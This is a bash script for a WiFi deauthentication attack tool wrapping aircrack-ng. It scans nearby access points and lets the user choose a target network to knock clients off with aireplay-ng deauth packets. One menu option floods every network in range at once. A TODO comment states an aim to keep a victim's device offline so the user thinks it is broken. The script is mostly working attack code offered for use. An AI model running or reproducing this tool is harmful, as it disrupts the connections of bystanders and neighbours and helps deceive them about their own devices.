#!/bin/bash

#TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)

main()
{
	su_req
	requirements
	clear
	menu
}

su_req()
{
	echo
	echo "	You'll need superuser permissions, to use the script."
	echo "	Asking superuser permissions..."
	echo
	sudo -v
}

requirements()
{
	#aircrack-ng
	exists=$(apt list --installed aircrack-ng 2>&1 | grep -m 1 -o "aircrack-ng")

	if [ "$exists" != "aircrack-ng" ];
	then
		sudo apt-get install aircrack-ng
		clear
		main #restart script after installation until user finally installs it
	else
		printf "exists" #debug info
	fi

	#set a trap for the end
	trap clean_up EXIT
}

clean_up()
{
	#clean_up all scan data
	clean_up_junk

	#restore your connection
	stop_mon
}

clean_up_junk()
{
	if [ -d ""$PWD"/perish_dump" ]
	then
		rm -rf "$PWD"/perish_dump
	fi
}

create_working_folder()
{
	if [ ! -d "perish_dump" ]
	then
		mkdir perish_dump
	fi
}

print_menu()
{
	print_status
	echo
	echo " Main Menu"
	echo
	echo "   0    Exit"
	echo "   1    Attack a selected network"
	echo "   2    Disconnect the perimeter (WIP)"
	echo "   3    Toggle monitor mode"
	echo
	echo -n "	Choose an option : "
}

menu()
{
	#each time menu is called, clean up previous scans
	clean_up_junk

	#create the working directory, where we save our scan files temporarily
	create_working_folder
	
	#print the menu and choose your option afterwards
	print_menu

	read option
	clear
	case $option in
		0 )
			clean_up
			exit
			;;

		1 )
			attack_network
			menu
			;;

		2 )
			haki
			menu
			;;

		3 )
			toggle_monitor
			menu
			;;

		* )
			echo
			echo "		Invalid option, try again"
			sleep 1
			menu
			;;
		esac
}

#Get some variables
get_ap()
{
	get_your_card
	your_AP=$(iwconfig 2>&1 | grep -A 2 $your_CARD | grep -o -i "Point.*" | awk '{print $2}') # after Access Point
}

get_ap_name()
{
	get_your_card
	your_AP_name=$(iwconfig 2>&1 | grep -A 2 $your_CARD | grep -o -i "\".*" | awk '{print $1}') # after an " the AP name starts
}

get_mons()
{
	num_of_mon_modes=$(iwconfig 2>&1 | grep -c -i "Monitor" | awk '{print $1}')
}

get_mon_mode()
{
	mon_mode=$(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}')
}

get_cards()
{
	num_of_CARDS=$(iwconfig 2>&1 | awk '{print $1}' | grep -c -o "wl.*")
}

get_your_card()
{
	your_CARD=$(iwconfig 2>&1 | awk '{print $1}' | grep -m 1 -o "wl.*")
}


haki()
{
	scan 10

	get_mon_mode

	#send 128 deauth packets to each wifi network
	while read essid
	do
		sudo aireplay-ng -0 128 -e $essid $mon_mode --ignore-negative-one
	done < "$PWD"/perish_dump/essids
}


toggle_monitor()
{
	## Don't start unless we have a wifi device plugged
	get_cards
	if [ "$num_of_CARDS" -eq 0 ]; # Bound to change if script has multi-card support
	then
		echo "	ERROR : Connect a wifi device first. Exiting..."
		sleep 2
		exit
	fi

	## Put in monitor mode if not already, unless we have a problem
	get_mons
	if  [ "$num_of_mon_modes" -ge 1 ];
	then #stop mon
		stop_mon
	elif [ "$num_of_mon_modes" -eq 0 ];
	then #start mon
		start_mon
	else #give up
		clear
		echo
		echo "	Unexpected error. Exiting..."
		sleep 2
		exit
	fi
}

stop_mon()
{
	clear
	get_mon_mode
	sudo airmon-ng stop $mon_mode
	sudo service network-manager start
	clear
}

start_mon()
{
	clear
	sudo airmon-ng check kill
	get_your_card
	sudo airmon-ng start $your_CARD
	clear
}

attack_network()
{
	#this creates the list of APs
	scan 10
	#this selects the target network (your_AP) and gets the number of attacks (n)
	select_target_network
	#this sets your_AP
	get_ap
	#this sets mon_mode
	get_mon_mode

	#this gets the number of monitor modes enabled
	get_mons

	if [[ "$num_of_mon_modes" -lt 1 ]]; then
		echo "  Enable monitor mode first!"
		sleep 2
	else
		echo "	Press Ctrl + C to stop the attack anytime."
		echo
		sleep 3
		#sudo aireplay-ng -0 $n -a $your_AP -c $mac $mon_mode --ignore-negative-one
		sudo aireplay-ng -0 $n -e $target_network $mon_mode --ignore-negative-one
	fi
}

select_target_network()
{
	clear
	echo
	echo "	List of devices found in your perimeter :"
	echo
	echo "   0	Cancel and return to main menu"

	#count and show how many devices we found
	local i=1
	while read device
	do
		if [ "$device" != "$your_AP" ]; then #ignore yourself
			echo "   $((i++))	$device"
		fi
	done < "$PWD"/perish_dump/essids

	echo
	echo -n "	Target your network : "
	read network

	case $network in
	0 )
		menu
		;;

	[1-$i] )
		#gets only the number of line (mac in this case) you asked for
		target_network=$(sed -n "${network}{p;q;}" "$PWD"/perish_dump/essids)

		#ask number of attacks only after you choose your victim
		get_num_of_attacks
		;;

	* )
		echo "	Invalid option, try again"
		sleep 1
		select_target_network
		;;
	esac
}

scan()
{
	get_mon_mode
	scan_interval=$1
	sudo airodump-ng $mon_mode --output-format kismet --write ""$PWD"/perish_dump/scan_data" > /dev/null 2>&1 & scan_ui
	sudo killall airodump-ng

	awk -F "\"*;\"*" '{print $4}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/bssids
	awk -F "\"*;\"*" '{print $3}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/essids
}

scan_ui()
{
	while [ $scan_interval -gt 0 ]; do
		echo "	Scanning, please wait $scan_interval sec"
		sleep 1
		clear
		let scan_interval=scan_interval-1
	done
}

get_num_of_attacks()
{
	echo
	echo " How many attacks? (Usually 5 are enough to disconnect someone momentarily)"
	echo -n "	Attacks : "
	read n
	case $n in #TODO: Check for negative numbers
		# *[a-zA-Z]*|"") # this means only digits (neither null nor alphabetical) --best way, trust me
		[0-1000] )
			echo "	Invalid input, try again"
			sleep 1
			get_num_of_attacks
			;;
	esac
	clear
}

print_status()
{
	get_ap
	get_ap_name
	get_your_card
	get_mons
	get_mon_mode


	clear
	echo
	echo " ==============================[STATUS]================================="
	if [[ "$num_of_mon_modes" -lt 1 ]]; then
		echo " Monitor mode not active"
		
		if [[ "$your_AP" == "Not-Associated" ]]; then
			echo " You are not connected to a WiFi network!"
		else
			echo " Connected to $your_AP_name ($your_AP) with $your_CARD"
			#echo " Connected to DemoAP (01:23:45:AB:CD:EF) with wlo1"
		fi
	else
		echo " Monitor mode active on "$mon_mode""
	fi

	
	echo " ======================================================================="
	echo
}

#Here starts the script
main
